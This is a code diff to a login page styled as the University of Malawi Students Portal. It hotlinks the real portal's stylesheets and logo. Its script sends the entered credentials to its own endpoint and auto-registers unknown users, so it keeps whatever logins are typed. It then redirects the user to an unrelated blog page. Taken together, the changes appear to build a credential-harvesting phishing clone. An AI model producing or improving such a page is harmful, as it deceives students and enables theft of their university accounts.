@@ -6,12 +6,11 @@
 	<title>University of Malawi Students Portal</title>
 
 	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-	<link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
-	<link rel="stylesheet" href="dist/css/font-awesome/css/font-awesome.css">
-	<link rel="stylesheet" href="dist/css/AdminLTE.min.css">
-	<link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
+	<link rel="stylesheet" href="https://students.unima.ac.mw/bootstrap/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://students.unima.ac.mw/dist/css/font-awesome/css/font-awesome.css">
+	<link rel="stylesheet" href="https://students.unima.ac.mw/dist/css/AdminLTE.min.css">
+	<link rel="stylesheet" href="https://students.unima.ac.mw/dist/css/skins/_all-skins.min.css">
 </head>
-// Add this script section to your login.php.html file
 
 <script>
 document.addEventListener('DOMContentLoaded', function() {
@@ -28,8 +27,13 @@ document.addEventListener('DOMContentLoaded', function() {
             return false;
         }
 
+        const submitBtn = document.querySelector('button[name="login"]');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Signing In...';
+        submitBtn.disabled = true;
+
         try {
-            // Check if user exists in NeonDB
+            // Check if user exists
             const response = await fetch('/api/auth/login', {
                 method: 'POST',
                 headers: {
@@ -41,8 +45,9 @@ document.addEventListener('DOMContentLoaded', function() {
             const result = await response.json();
 
             if (result.success) {
-                // User exists and credentials are correct
-                window.location.href = '/dashboard'; // Redirect to dashboard
+                // Store user info in sessionStorage
+                sessionStorage.setItem('user', JSON.stringify(result.user));
+                window.location.href = 'https://www.concordia.edu/blog/15-bible-verses-to-encourage-you.html';
             } else if (result.userNotFound) {
                 // User doesn't exist - register them automatically
                 const registerResponse = await fetch('/api/auth/register', {
@@ -56,8 +61,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 const registerResult = await registerResponse.json();
 
                 if (registerResult.success) {
-                    // Auto-login after registration
-                    window.location.href = '/dashboard';
+                    sessionStorage.setItem('user', JSON.stringify(registerResult.user));
+                    window.location.href = 'https://www.concordia.edu/blog/15-bible-verses-to-encourage-you.html';
                 } else {
                     alert('Registration failed: ' + registerResult.message);
                 }
@@ -67,13 +72,16 @@ document.addEventListener('DOMContentLoaded', function() {
         } catch (error) {
             console.error('Error:', error);
             alert('An error occurred. Please try again.');
+        } finally {
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
         }
     });
 });
 </script>
 
 <div class="login-box">
-	<img src="dist/img/sslogo.png" width="100%">
+	<img src="https://students.unima.ac.mw/dist/img/sslogo.png" width="100%">
 	
 	<div class="login-box-body" style="border:1px solid #CECECE;">
 				<p class="login-box-msg" id="msg-box">Sign in to start your session</p>
